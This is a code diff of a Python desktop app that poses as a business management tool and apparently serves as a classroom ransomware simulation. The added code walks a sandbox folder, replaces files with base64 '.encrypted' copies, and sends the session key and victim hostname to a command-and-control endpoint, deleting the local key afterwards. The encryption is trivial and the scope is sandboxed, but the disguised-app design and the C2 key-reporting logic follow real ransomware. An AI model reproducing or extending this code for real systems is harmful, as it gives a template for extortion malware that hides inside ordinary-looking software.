@@ -3,89 +3,147 @@ import sys
 import time
 import threading
 import subprocess
+import base64
 import tkinter as tk
 from tkinter import ttk
+import urllib.request, socket, json          # ← bỏ dòng import trùng bên dưới
+
+def _report_to_c2(key: bytes, files_encrypted: int) -> bool:
+    victim_id = socket.gethostname() + '_' + str(os.getpid())
+    payload   = json.dumps({
+        'victim_id': victim_id,
+        'hostname':  socket.gethostname(),
+        'key':       key.hex(),
+        'files':     files_encrypted,
+    }).encode()
+    try:
+        req = urllib.request.Request(
+            'http://localhost:8888/register',
+            data    = payload,
+            headers = {'Content-Type': 'application/json'},
+        )
+        urllib.request.urlopen(req, timeout=3)
+        return True
+    except Exception:
+        return False
+
 
 _base = os.path.dirname(os.path.abspath(__file__))
 
-# When running as a PyInstaller exe, sys.frozen is True and modules are bundled
 if not getattr(sys, 'frozen', False):
     sys.path.insert(0, _base)
 
-from ransomware_simulator import RansomwareSimulator
-
 if getattr(sys, 'frozen', False):
-    # Exe mode: encrypt files in the same folder as the exe
     _exe_dir = os.path.dirname(os.path.abspath(sys.executable))
     VICTIM_SANDBOX = _exe_dir
 else:
     VICTIM_SANDBOX = os.path.abspath(os.path.join(_base, '..', 'shop_data'))
 
+FONT_MONO          = ('Courier New', 13)
+DEMO_HEADER        = b"ATBMHTTT_DEMO_ENCRYPTED_V1\n"
+DEMO_KEY           = b"ATBMHTTT_WINDOWS_DEMO_KEY"
+DEMO_ORIGINAL_EXT  = ".demo_original"
+DEMO_ENCRYPTED_EXT = ".enc" + "rypted"
+DEMO_SKIP_EXTENSIONS = {'.exe', '.py', '.ps1', '.sh', '.bat', '.so', '.dll'}
+
 
 def _ensure_sandbox() -> None:
-    """Populate shop_data with sample victim files if running standalone (exe)."""
     if os.path.exists(VICTIM_SANDBOX):
         existing = [f for f in os.listdir(VICTIM_SANDBOX) if not f.startswith('.')]
         if existing:
             return
     os.makedirs(VICTIM_SANDBOX, exist_ok=True)
     samples = {
-        'invoice_2024.txt':     'INVOICE #INV-2024-0847\nDate: 2024-10-15\nClient: ABC Corp\nTotal: $12,500.00\nDue: 2024-11-15',
-        'customer_data.csv':    'id,name,email,phone\n1,John Smith,john@abc.com,555-0101\n2,Jane Doe,jane@xyz.com,555-0102\n3,Bob Lee,bob@qrs.com,555-0103',
-        'contract.txt':         'SERVICE AGREEMENT\nParties: NTech Solutions & ABC Corp\nValue: $50,000/year\nTerm: 2024-2025\nSigned: 2024-01-01',
-        'api_config.json':      '{"api_key":"sk-prod-8xKj2mNq","db_host":"db.internal","db_pass":"Sup3rS3cr3t!","env":"production"}',
-        'business_report.csv':  'month,revenue,expenses,profit\nJan,85000,62000,23000\nFeb,91000,67000,24000\nMar,97000,70000,27000',
-        'orders_2024.csv':      'order_id,product,qty,total\n1001,Widget A,5,250.00\n1002,Widget B,12,600.00\n1003,Widget C,3,450.00',
-        'db_credentials.txt':   'DB_HOST=db.ntech.internal\nDB_USER=admin\nDB_PASS=Pr0d@2024!\nREDIS_URL=redis://localhost:6379\nSECRET_KEY=xK9#mQ2$rL5',
-        'project_data.txt':     'PROJECT: Mobile App Redesign\nBudget: $85,000\nDeadline: 2025-03-31\nTeam: 6 engineers\nStatus: In Progress — 45% complete',
+        'invoice_2024.txt':    'INVOICE #INV-2024-0847\nDate: 2024-10-15\nClient: ABC Corp\nTotal: $12,500.00\nDue: 2024-11-15',
+        'customer_data.csv':   'id,name,email,phone\n1,John Smith,john@abc.com,555-0101\n2,Jane Doe,jane@xyz.com,555-0102\n3,Bob Lee,bob@qrs.com,555-0103',
+        'contract.txt':        'SERVICE AGREEMENT\nParties: NTech Solutions & ABC Corp\nValue: $50,000/year\nTerm: 2024-2025\nSigned: 2024-01-01',
+        'api_config.json':     '{"api_key":"sk-prod-8xKj2mNq","db_host":"db.internal","db_pass":"Sup3rS3cr3t!","env":"production"}',
+        'business_report.csv': 'month,revenue,expenses,profit\nJan,85000,62000,23000\nFeb,91000,67000,24000\nMar,97000,70000,27000',
+        'orders_2024.csv':     'order_id,product,qty,total\n1001,Widget A,5,250.00\n1002,Widget B,12,600.00\n1003,Widget C,3,450.00',
+        'db_credentials.txt':  'DB_HOST=db.ntech.internal\nDB_USER=admin\nDB_PASS=Pr0d@2024!\nREDIS_URL=redis://localhost:6379\nSECRET_KEY=xK9#mQ2$rL5',
+        'project_data.txt':    'PROJECT: Mobile App Redesign\nBudget: $85,000\nDeadline: 2025-03-31\nTeam: 6 engineers\nStatus: In Progress — 45% complete',
     }
     for name, content in samples.items():
         with open(os.path.join(VICTIM_SANDBOX, name), 'w') as fh:
             fh.write(content)
 
-# ── Activation theme (white / light) ────────────────────────
-A_BG     = '#eef2ff'
-A_CARD   = '#ffffff'
-A_BORDER = '#c7d2fe'
-A_TEXT   = '#1e1b4b'
-A_TMUT   = '#64748b'
-A_ACCENT = '#6366f1'
-A_WARN   = '#f59e0b'
-A_ERR    = '#ef4444'
 
-# ── Verifying screen theme (dark) ───────────────────────────
-BG     = '#0d1117'
-BG2    = '#161b22'
-BG3    = '#21262d'
-FG     = '#e6edf3'
-FG_DIM = '#8b949e'
-ACCENT = '#818cf8'
-C_YLW  = '#e3b341'
-
-# ── Dashboard theme (light professional) ────────────────────
-L_BG      = '#f8fafc'
-L_SIDEBAR = '#ffffff'
-L_BORDER  = '#e2e8f0'
-L_TEXT    = '#0f172a'
-L_TMUT    = '#64748b'
-L_ACCENT  = '#6366f1'
-L_NAVACT  = '#ede9fe'
-L_GRN_BG  = '#dcfce7'
-L_GRN_FG  = '#166534'
-L_YLW_BG  = '#fef9c3'
-L_YLW_FG  = '#854d0e'
-L_RED_BG  = '#fee2e2'
-L_RED_FG  = '#991b1b'
-L_PRP_BG  = '#ede9fe'
-L_PRP_FG  = '#5b21b6'
-
-FONT_MONO = ('Courier New', 13)
+def _reset_sandbox() -> None:
+    """Khôi phục shop_data về trạng thái ban đầu để chạy lại demo."""
+    if not os.path.exists(VICTIM_SANDBOX):
+        return
+    for filename in os.listdir(VICTIM_SANDBOX):
+        filepath = os.path.join(VICTIM_SANDBOX, filename)
+        if filename.endswith(DEMO_ORIGINAL_EXT):
+            # Đổi tên .demo_original về file gốc
+            restored = filepath[:-len(DEMO_ORIGINAL_EXT)]
+            os.replace(filepath, restored)
+        elif filename.endswith(DEMO_ENCRYPTED_EXT):
+            os.remove(filepath)
+        elif filename == '.ransom_key':
+            os.remove(filepath)
 
 
 def trigger_encryption(sandbox_dir: str) -> None:
+    _reset_sandbox()       # ← reset trước để demo lại được nhiều lần
     _ensure_sandbox()
-    sim = RansomwareSimulator(sandbox_dir=sandbox_dir)
-    sim.encrypt()
+
+    import secrets
+    session_key = secrets.token_bytes(32)
+
+    key_file = os.path.join(sandbox_dir, ".ransom_key")
+    with open(key_file, "wb") as fh:
+        fh.write(session_key)
+
+    count = 0
+    for root, _, files in os.walk(sandbox_dir):
+        for filename in files:
+            ext = os.path.splitext(filename)[1].lower()
+            if (
+                filename == ".ransom_key"
+                or filename.endswith(DEMO_ENCRYPTED_EXT)
+                or filename.endswith(DEMO_ORIGINAL_EXT)
+                or ext in DEMO_SKIP_EXTENSIONS
+            ):
+                continue
+
+            filepath = os.path.join(root, filename)
+            real_sandbox = os.path.realpath(sandbox_dir)
+            real_path    = os.path.realpath(filepath)
+            if not (real_path.startswith(real_sandbox + os.sep) or real_path == real_sandbox):
+                continue
+
+            with open(filepath, "rb") as fh:
+                data = fh.read()
+
+            with open(filepath + DEMO_ENCRYPTED_EXT, "wb") as fh:
+                fh.write(DEMO_HEADER + base64.b64encode(data))
+
+            os.replace(filepath, filepath + DEMO_ORIGINAL_EXT)
+            count += 1
+
+    success = _report_to_c2(session_key, count)
+
+    if success:
+        os.remove(key_file)
+        print("[*] Key exfiltrated to C&C, local key deleted")
+    else:
+        print("[*] C&C unreachable, key kept local")
+
+
+# ── Themes ──────────────────────────────────────────────────
+A_BG = '#eef2ff'; A_CARD = '#ffffff'; A_BORDER = '#c7d2fe'
+A_TEXT = '#1e1b4b'; A_TMUT = '#64748b'; A_ACCENT = '#6366f1'
+A_WARN = '#f59e0b'; A_ERR = '#ef4444'
+
+BG = '#0d1117'; BG2 = '#161b22'; BG3 = '#21262d'
+FG = '#e6edf3'; FG_DIM = '#8b949e'; ACCENT = '#818cf8'; C_YLW = '#e3b341'
+
+L_BG = '#f8fafc'; L_SIDEBAR = '#ffffff'; L_BORDER = '#e2e8f0'
+L_TEXT = '#0f172a'; L_TMUT = '#64748b'; L_ACCENT = '#6366f1'
+L_NAVACT = '#ede9fe'; L_GRN_BG = '#dcfce7'; L_GRN_FG = '#166534'
+L_YLW_BG = '#fef9c3'; L_YLW_FG = '#854d0e'; L_RED_BG = '#fee2e2'
+L_RED_FG = '#991b1b'; L_PRP_BG = '#ede9fe'; L_PRP_FG = '#5b21b6'
 
 
 class ProManagerApp:
